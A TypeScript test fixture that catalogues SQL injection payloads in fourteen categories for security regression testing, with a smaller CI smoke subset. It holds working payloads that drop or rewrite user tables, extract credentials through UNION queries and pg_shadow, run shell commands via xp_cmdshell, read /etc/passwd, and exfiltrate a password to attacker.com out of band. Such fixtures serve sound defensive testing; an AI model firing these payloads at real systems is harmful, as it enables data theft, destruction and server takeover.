/**
 * SQL Injection Payload Catalog
 * ─────────────────────────────
 * A comprehensive set of SQL injection payloads used for security regression
 * testing. Sourced from OWASP Testing Guide, PayloadsAllTheThings, and common
 * penetration-testing databases.
 *
 * Categories:
 *   1.  Tautologies (always-true conditions)
 *   2.  Piggybacked / stacked queries
 *   3.  UNION-based data extraction
 *   4.  Boolean-based blind inference
 *   5.  Time-based blind inference (delay probes)
 *   6.  Error-based extraction
 *   7.  Comment sequence variants
 *   8.  Hex / char encoding bypass
 *   9.  Double / URL encoding bypass
 *   10. Null-byte and special character injection
 *   11. Second-order / stored injection markers
 *   12. PostgreSQL-specific probes
 *   13. Out-of-band (OOB) / DNS probe patterns
 *   14. Truncation / oversized payloads
 */

// ---------------------------------------------------------------------------
// 1. Tautologies — always-true WHERE clauses
// ---------------------------------------------------------------------------
export const tautologyPayloads: string[] = [
  "' OR '1'='1",
  "' OR 1=1 --",
  "1 OR 1=1",
  "\" OR \"\"=\"",
  "' OR 'x'='x",
  "' OR 1=1#",
  "' OR 1=1/*",
  "admin'--",
  "' OR TRUE--",
  "' OR TRUE#",
  "' OR 1--",
  "OR 1=1",
  "' OR ''='",
  "') OR ('1'='1",
  "') OR ('x'='x",
  "1' OR '1'='1",
  "1 OR 1=1--",
  "a' OR 'a'='a",
  "\" OR 1=1--",
  "\" OR 1=1#",
];

// ---------------------------------------------------------------------------
// 2. Piggybacked / stacked queries
// ---------------------------------------------------------------------------
export const stackedQueryPayloads: string[] = [
  "'; DROP TABLE users; --",
  "1; DROP TABLE users",
  "'; SELECT pg_sleep(5); --",
  "'; SELECT 1; --",
  "'; INSERT INTO users VALUES (1,'admin','admin'); --",
  "'; UPDATE users SET password='hacked' WHERE '1'='1'; --",
  "'; DELETE FROM users; --",
  "1; EXEC xp_cmdshell('dir'); --",
  "'; EXEC master..xp_cmdshell('ping 127.0.0.1'); --",
  "'); CALL pg_sleep(5); --",
];

// ---------------------------------------------------------------------------
// 3. UNION-based data extraction
// ---------------------------------------------------------------------------
export const unionPayloads: string[] = [
  "' UNION SELECT null --",
  "' UNION SELECT null, null, null --",
  "' UNION SELECT username, password FROM users --",
  "' UNION SELECT table_name FROM information_schema.tables --",
  "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
  "1 UNION SELECT null--",
  "1 UNION SELECT null,null--",
  "1 UNION ALL SELECT null--",
  "' UNION SELECT @@version --",
  "' UNION SELECT version() --",
  "' UNION SELECT current_database() --",
  "' UNION SELECT current_user --",
  "' UNION SELECT 1,2,3 --",
  "-1 UNION SELECT 1,2,3--",
  "' UNION (SELECT username, password, null FROM users) --",
  "' UNION SELECT NULL,NULL,NULL,NULL --",
];

// ---------------------------------------------------------------------------
// 4. Boolean-based blind inference
// ---------------------------------------------------------------------------
export const booleanBlindPayloads: string[] = [
  "' AND 1=1 --",
  "' AND 1=2 --",
  "1 AND 1=2",
  "' AND 1=1#",
  "' AND 1=2#",
  "' AND 'a'='a",
  "' AND 'a'='b",
  "1' AND '1'='1",
  "1' AND '1'='2",
  "' AND (SELECT 1)=1 --",
  "' AND (SELECT 1)=2 --",
  "' AND (SELECT COUNT(*) FROM users)>0 --",
  "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --",
  "' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64 --",
  "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>0 --",
];

// ---------------------------------------------------------------------------
// 5. Time-based blind inference (delay probes)
// ---------------------------------------------------------------------------
export const timeBasedPayloads: string[] = [
  "'; SELECT pg_sleep(5); --",
  "' AND (SELECT pg_sleep(5)) --",
  "1; SELECT pg_sleep(5)--",
  "' AND 1=(SELECT 1 FROM pg_sleep(5)) --",
  "'; WAITFOR DELAY '0:0:5'; --",
  "1; WAITFOR DELAY '0:0:5'--",
  "' OR SLEEP(5) --",
  "1 OR SLEEP(5)--",
  "' AND SLEEP(5) --",
  "'; SELECT SLEEP(5); --",
  "'; SELECT BENCHMARK(1000000,MD5(1)); --",
  "1 AND SLEEP(5)--",
];

// ---------------------------------------------------------------------------
// 6. Error-based extraction
// ---------------------------------------------------------------------------
export const errorBasedPayloads: string[] = [
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
  "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) --",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
  "' AND (1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)))",
  "' AND 1=CONVERT(int,db_name())--",
  "' AND EXP(~(SELECT * FROM (SELECT 1)t)) --",
  "' OR 1=1 INTO OUTFILE '/tmp/out' --",
  "'; SELECT 1/0; --",
];

// ---------------------------------------------------------------------------
// 7. Comment sequence variants
// ---------------------------------------------------------------------------
export const commentPayloads: string[] = [
  "/*",
  "--",
  "#",
  "'; --",
  "'; #",
  "admin' --",
  "admin' #",
  "'--",
  "'/*",
  "' --",
  "' #",
  "/*comment*/",
  "/*!50000 1*/",
  "-- comment",
  "# comment",
  "/*! UNION */",
];

// ---------------------------------------------------------------------------
// 8. Hex / CHAR encoding bypass
// ---------------------------------------------------------------------------
export const encodingPayloads: string[] = [
  "' OR 0x313d31 --",
  "CHAR(39)OR CHAR(39)1CHAR(39)=CHAR(39)1",
  "0x27204f52202731",       // hex for: ' OR '1
  "CHAR(39,79,82,39,49,39,61,39,49)",
  "0x53454c454354",         // SELECT
  "0x44524f50",             // DROP
  "0x55534552",             // USER
  "CHAR(115,101,108,101,99,116)",
  "' OR CHAR(49)=CHAR(49)--",
  "CHAR(68,82,79,80,32,84,65,66,76,69,32,117,115,101,114,115)",
];

// ---------------------------------------------------------------------------
// 9. Double / URL encoding bypass
// ---------------------------------------------------------------------------
export const doubleEncodingPayloads: string[] = [
  "%27%20OR%20%271%27%3D%271",   // URL encoded: ' OR '1'='1
  "%2527",                         // double-encoded single quote: %27
  "%27OR%271%27%3D%271",
  "%5C%27 OR 1=1--",
  "\\' OR 1=1--",
  "%27 OR %271%27=%271",
  "%%2727",
  "%25%27",
  "%60 OR 1=1--",                  // backtick variant
  "%22 OR %221%22=%221",           // double-quote variant
];

// ---------------------------------------------------------------------------
// 10. Null-byte and special character injection
// ---------------------------------------------------------------------------
export const nullBytePayloads: string[] = [
  "\0' OR '1'='1",
  "\x00' OR '1'='1",
  "' OR '1'='1\0",
  "\0; DROP TABLE users; --",
  "'; EXEC xp\x00_cmdshell('dir')--",
  "\n' OR '1'='1",
  "\r\n' OR '1'='1",
  "\t' OR '1'='1",
  "' OR 1=1\x00",
  "admin\x00'--",
];

// ---------------------------------------------------------------------------
// 11. Second-order / stored injection markers
// ---------------------------------------------------------------------------
export const storedInjectionPayloads: string[] = [
  "admin'--",
  "admin'/*",
  "' or 1=1 limit 1 -- -+",
  "'; exec xp_cmdshell('net user'); --",
  "'; exec master..xp_cmdshell('whoami'); --",
  "1' AND '1'='1' UNION SELECT password FROM users--",
  "\\' OR 1=1--",
  "\\; DROP TABLE users;--",
  "test'",
  "test\"",
  "test`",
];

// ---------------------------------------------------------------------------
// 12. PostgreSQL-specific probes
// ---------------------------------------------------------------------------
export const postgresSpecificPayloads: string[] = [
  "' AND 1=CAST(version() AS int) --",
  "'; SELECT current_database(); --",
  "'; SELECT pg_read_file('/etc/passwd') --",
  "'; SELECT * FROM pg_user; --",
  "' UNION SELECT usename, passwd FROM pg_shadow --",
  "'; SELECT * FROM pg_tables; --",
  "'; COPY users TO '/tmp/out'; --",
  "'; CREATE TABLE hacked (id INT); --",
  "' AND EXTRACT(EPOCH FROM NOW())=EXTRACT(EPOCH FROM NOW()) --",
  "' AND 1=(SELECT 1 FROM pg_proc LIMIT 1) --",
  "'; SELECT pg_sleep(0); --",
  "'' || pg_sleep(5) || ''",
];

// ---------------------------------------------------------------------------
// 13. Out-of-band (OOB) / DNS probe patterns
// ---------------------------------------------------------------------------
export const outOfBandPayloads: string[] = [
  "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\foo')) --",
  "'; SELECT pg_read_file('//attacker.com/share') --",
  "'; EXEC master..xp_dirtree('//attacker.com/share') --",
  "1; EXEC master..xp_fileexist('\\\\attacker.com\\share') --",
  "'; dbms_ldap.init('attacker.com',389); --",
];

// ---------------------------------------------------------------------------
// 14. Truncation / oversized payloads
// ---------------------------------------------------------------------------
export const truncationPayloads: string[] = [
  "A".repeat(1000),
  "A".repeat(10000),
  "' " + "OR 1=1 ".repeat(100) + "--",
  " ".repeat(500) + "' OR '1'='1",
  "'\t" + "\t".repeat(200) + "OR 1=1--",
];

// ---------------------------------------------------------------------------
// Composite export: all payloads in a single flat array (used by test suites)
// ---------------------------------------------------------------------------
export const sqlInjectionPayloads: string[] = [
  ...tautologyPayloads,
  ...stackedQueryPayloads,
  ...unionPayloads,
  ...booleanBlindPayloads,
  ...timeBasedPayloads,
  ...errorBasedPayloads,
  ...commentPayloads,
  ...encodingPayloads,
  ...doubleEncodingPayloads,
  ...nullBytePayloads,
  ...storedInjectionPayloads,
  ...postgresSpecificPayloads,
  ...outOfBandPayloads,
  ...truncationPayloads,
];

/**
 * A lean "smoke" subset used for fast CI runs — covers one payload per
 * injection class so tests finish in seconds without sacrificing breadth.
 */
export const sqlInjectionSmokeSuite: string[] = [
  // tautology
  "' OR '1'='1",
  // stacked query
  "'; DROP TABLE users; --",
  // UNION
  "' UNION SELECT null --",
  // boolean blind
  "' AND 1=2 --",
  // time-based
  "' AND (SELECT pg_sleep(5)) --",
  // error-based
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
  // comment
  "' --",
  // hex encoding
  "0x27204f52202731",
  // URL encoding
  "%27%20OR%20%271%27%3D%271",
  // null-byte
  "\0' OR '1'='1",
  // stored marker
  "admin'--",
  // postgres-specific
  "'; SELECT current_database(); --",
  // OOB
  "'; EXEC master..xp_dirtree('//attacker.com/share') --",
  // truncation
  "A".repeat(1000),
];
